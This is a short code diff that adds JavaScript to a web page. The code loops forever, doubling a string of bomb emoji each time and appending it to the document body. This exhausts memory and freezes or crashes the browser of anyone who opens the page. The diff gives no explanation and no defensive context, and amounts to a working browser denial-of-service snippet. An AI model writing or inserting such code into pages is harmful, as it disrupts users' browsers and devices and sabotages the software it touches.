@@ -1,0 +1,5 @@
+let boom = "💣";
+while (true) {
+  boom += boom;
+  document.body.appendChild(document.createTextNode(boom));
+}
